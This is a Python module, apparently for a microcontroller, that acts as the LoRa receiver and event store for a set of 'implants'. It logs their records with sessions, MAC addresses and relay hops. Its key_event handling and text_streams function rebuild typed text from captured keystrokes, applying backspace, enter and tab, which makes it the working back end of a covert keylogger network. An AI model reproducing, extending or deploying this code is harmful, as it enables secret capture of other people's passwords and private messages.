"""Persistent event catalogue used by the external LoRa receiver."""

import os
import time
try:
    import ujson as json
except ImportError:
    import json

ALLOWED_KINDS = ("heartbeat", "synthetic_counter", "link_test", "key_event")


def _now_ms():
    try: return time.ticks_ms()
    except AttributeError: return int(time.time() * 1000)


class LoRaSink:
    def __init__(self, directory="logs", implants_path="implants.json",
                 sessions_path="sessions.json", max_bytes=262144, max_files=8,
                 ring_size=256, radio=None):
        self.directory, self.implants_path, self.sessions_path = directory, implants_path, sessions_path
        self.max_bytes, self.max_files, self.ring_size, self.radio = max_bytes, max_files, ring_size, radio
        self.events, self.seen_batches, self.seen_events = [], set(), set()
        self.implants = self._load(implants_path, {})
        self.sessions = self._load(sessions_path, {})
        self.event_id = 0; self.invalid = self.duplicates = self.dropped_log = 0
        try: os.mkdir(directory)
        except OSError: pass
        self._recover_event_id()

    def _load(self, path, default):
        try:
            with open(path, "r") as source: return json.load(source)
        except (OSError, ValueError): return default

    def _save(self, path, data):
        temporary = path + ".tmp"
        with open(temporary, "w") as output: output.write(json.dumps(data))
        try: os.remove(path)
        except OSError: pass
        os.rename(temporary, path)

    def _files(self):
        try: names = os.listdir(self.directory)
        except OSError: return []
        return sorted(name for name in names if name.endswith(".jsonl"))

    def _recover_event_id(self):
        for name in self._files():
            try:
                with open(self.directory + "/" + name, "r") as source:
                    for line in source:
                        try:
                            event = json.loads(line)
                            event_id = int(event.get("event_id", 0))
                            self.event_id = max(self.event_id, event_id)
                            if event_id and event.get("kind") in ALLOWED_KINDS:
                                self.events.append(event)
                                if len(self.events) > self.ring_size:
                                    self.events.pop(0)
                                key = (event.get("session"), event.get("source"),
                                       event.get("sequence"))
                                self.seen_events.add(key)
                                self.seen_batches.add((event.get("session"),
                                                       event.get("msg_seq")))
                        except (ValueError, TypeError, AttributeError):
                            pass
            except OSError: pass
        while len(self.seen_events) > 4096:
            self.seen_events.pop()
        while len(self.seen_batches) > 1024:
            self.seen_batches.pop()

    def _active_path(self, session):
        prefix = "mesh-%08x-" % session
        matching = [name for name in self._files() if name.startswith(prefix)]
        name = matching[-1] if matching else prefix + "0001.jsonl"
        path = self.directory + "/" + name
        try: size = os.stat(path)[6]
        except OSError: size = 0
        if size >= self.max_bytes:
            index = int(name[-10:-6]) + 1
            path = self.directory + "/" + prefix + "%04d.jsonl" % index
        return path

    def _rotate(self):
        files = self._files()
        while len(files) > self.max_files:
            try: os.remove(self.directory + "/" + files.pop(0))
            except OSError: break

    def ingest(self, session, message_seq, document, lora=None):
        batch_key = (session, message_seq)
        if batch_key in self.seen_batches: self.duplicates += 1; return []
        self.seen_batches.add(batch_key)
        if len(self.seen_batches) > 1024: self.seen_batches.pop()
        records = document.get("records", []) if isinstance(document, dict) else []
        if not isinstance(records, list): self.invalid += 1; return []
        gateway_id = str(document.get("gateway_id", "unknown"))[:64]
        accepted = []
        for item in records:
            record = self._normalize(item, session, message_seq, gateway_id, lora)
            if record is None: continue
            key = (session, record["source"], record["sequence"])
            if key in self.seen_events: self.duplicates += 1; continue
            self.seen_events.add(key); self.event_id += 1; record["event_id"] = self.event_id
            if len(self.seen_events) > 4096: self.seen_events.pop()
            path = self._active_path(session)
            try:
                with open(path, "a") as output: output.write(json.dumps(record) + "\n")
            except OSError: self.dropped_log += 1; continue
            self.events.append(record)
            if len(self.events) > self.ring_size: self.events.pop(0)
            accepted.append(record)
        sid = str(session)
        meta = self.sessions.get(sid, {})
        meta.update({"gateway_id": gateway_id, "last_event_id": self.event_id,
                     "event_count": int(meta.get("event_count", 0)) + len(accepted)})
        self.sessions[sid] = meta; self._save(self.sessions_path, self.sessions); self._rotate()
        return accepted

    def _normalize(self, item, session, message_seq, gateway_id, lora):
        if not isinstance(item, dict) or item.get("kind") not in ALLOWED_KINDS:
            self.invalid += 1; return None
        source = str(item.get("source", ""))[:64]
        if not source: self.invalid += 1; return None
        value = item.get("value", 0)
        if item["kind"] == "key_event":
            value = str(value)[:120]
        hops = max(0, int(item.get("hop_count", 0)))
        implant = self.implants.get(source, {})
        return {"recv_ms": _now_ms(), "session": session, "msg_seq": message_seq,
                "gateway_id": gateway_id, "source": source,
                "implant_label": implant.get("label", source),
                "implant_mac": implant.get("mac", ""),
                "sequence": int(item.get("sequence", 0)), "kind": item["kind"],
                "value": value, "hop_count": hops,
                "path": "direct" if hops <= 1 else "relay",
                "last_hop": item.get("last_hop", ""), "lora": lora or {}}

    def query(self, since=0, limit=100, implant="", kind="", session="", text=""):
        result = []; text = text.lower()
        for event in self.events:
            if event["event_id"] <= since: continue
            if implant and event["source"] != implant: continue
            if kind and event["kind"] != kind: continue
            if session and str(event["session"]) != str(session): continue
            if text and text not in json.dumps(event).lower(): continue
            result.append(event)
            if len(result) >= limit: break
        return result

    def text_streams(self, implant="", session="", max_chars=12000):
        """Reconstruct bounded, readable key-event streams per implant/session."""
        streams = {}
        for event in self.events:
            if event["kind"] != "key_event":
                continue
            if implant and event["source"] != implant:
                continue
            if session and str(event["session"]) != str(session):
                continue
            key = "%s:%s" % (event["source"], event["session"])
            stream = streams.get(key)
            if stream is None:
                stream = {"source": event["source"],
                          "implant_label": event["implant_label"],
                          "session": event["session"], "tokens": [],
                          "event_count": 0, "last_event_id": 0}
                streams[key] = stream
            value = str(event.get("value", ""))
            upper = value.upper()
            if upper in ("BKSP", "BACKSPACE"):
                if stream["tokens"]:
                    stream["tokens"].pop()
            elif upper in ("ENTER", "RETURN"):
                stream["tokens"].append("<ENTER>\n")
            elif upper == "TAB":
                stream["tokens"].append("<TAB>")
            elif upper == "SPACE":
                stream["tokens"].append(" ")
            else:
                stream["tokens"].append(value)
            stream["event_count"] += 1
            stream["last_event_id"] = event["event_id"]
        result = []
        for stream in streams.values():
            text = "".join(stream.pop("tokens"))
            stream["text"] = text[-max_chars:]
            stream["truncated"] = len(text) > max_chars
            result.append(stream)
        result.sort(key=lambda item: item["last_event_id"], reverse=True)
        return result

    def update_implant(self, implant_id, values):
        current = self.implants.get(implant_id, {})
        if "label" in values: current["label"] = str(values["label"])[:80]
        if "mac" in values: current["mac"] = str(values["mac"])[:17]
        self.implants[implant_id] = current; self._save(self.implants_path, self.implants)
        return current

    def update_session(self, session_id, values):
        current = self.sessions.get(str(session_id), {})
        for key in ("label", "notes"):
            if key in values: current[key] = str(values[key])[:240]
        self.sessions[str(session_id)] = current; self._save(self.sessions_path, self.sessions)
        return current

    def log_index(self):
        result = []
        for name in self._files():
            path = self.directory + "/" + name
            try: size = os.stat(path)[6]
            except OSError: continue
            result.append({"name": name, "bytes": size})
        return result

    def delete_log(self, name):
        if name not in self._files(): return False
        os.remove(self.directory + "/" + name); return True

    def status(self):
        link = self.radio.status() if self.radio is not None else {}
        return {"event_id": self.event_id, "ring_events": len(self.events),
                "implants": len(self.implants), "sessions": len(self.sessions),
                "invalid": self.invalid, "duplicates": self.duplicates,
                "dropped_log": self.dropped_log, "link": link}
